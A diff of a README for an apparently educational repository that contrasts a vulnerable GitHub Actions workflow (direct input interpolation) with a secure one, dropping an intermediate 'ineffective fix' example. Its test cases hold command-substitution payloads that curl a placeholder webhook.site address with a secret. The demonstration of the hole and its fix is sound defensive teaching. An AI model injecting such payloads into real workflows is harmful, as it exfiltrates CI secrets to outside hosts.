@@ -80,16 +80,13 @@ After testing and reviewing GitHub's official documentation:
 
 ## Demonstration Workflows
 
-This repository contains three workflows:
+This repository contains two workflows that demonstrate the security difference:
 
 ### 1. `vulnerable.yml` - Direct Interpolation (VULNERABLE)
-Uses `${{ inputs.* }}` directly in shell commands. Command injection succeeds.
+Uses `${{ inputs.* }}` directly in shell commands. Command injection succeeds via command substitution.
 
-### 2. `ineffective-fix.yml` - Environment Variables Only (IMPROVED BUT INCOMPLETE)
-Uses environment variables without validation. **Significantly safer** than direct interpolation, but still missing input validation.
-
-### 3. `secure.yml` - Complete Security Fix (SECURE)
-Uses **both** environment variables **and** input validation. This is the proper defense-in-depth approach.
+### 2. `secure.yml` - Proper Security Fix (SECURE)
+Uses **both** environment variables **and** input validation. This demonstrates the complete defense-in-depth approach recommended by GitHub.
 
 ---
 
@@ -141,28 +138,7 @@ $(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
 - ✅ Webhook receives request with secret
 - ✅ Proves the vulnerability is exploitable
 
-### Test Case 2: Environment Variables Without Validation
-
-**Workflow:** `ineffective-fix.yml`
-
-**Package name:**
-```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?test=envvar)
-```
-
-**Package version:**
-```
-1.0.0
-```
-
-**Expected result:**
-- ❌ Command substitution does NOT execute
-- ❌ No webhook request received
-- ✅ Proves environment variables provide protection
-
-**However:** This workflow still lacks input validation, which is required for complete security.
-
-### Test Case 3: Complete Security (Environment Variables + Validation)
+### Test Case 2: Secure Workflow with Protection
 
 **Workflow:** `secure.yml`
 
@@ -380,9 +356,8 @@ Only allow trusted users to trigger workflows:
 Run each test case and verify results:
 
 - [ ] **Test 1:** Direct interpolation (`vulnerable.yml`) → Secret exfiltrated ❌
-- [ ] **Test 2:** Env vars only (`ineffective-fix.yml`) → Injection blocked ✅
-- [ ] **Test 3:** Complete fix (`secure.yml`) + malicious input → Input rejected ✅
-- [ ] **Test 4:** Complete fix (`secure.yml`) + valid input → Workflow succeeds ✅
+- [ ] **Test 2:** Complete fix (`secure.yml`) + malicious input → Input rejected ✅
+- [ ] **Test 3:** Complete fix (`secure.yml`) + valid input → Workflow succeeds ✅
 
 ---
 
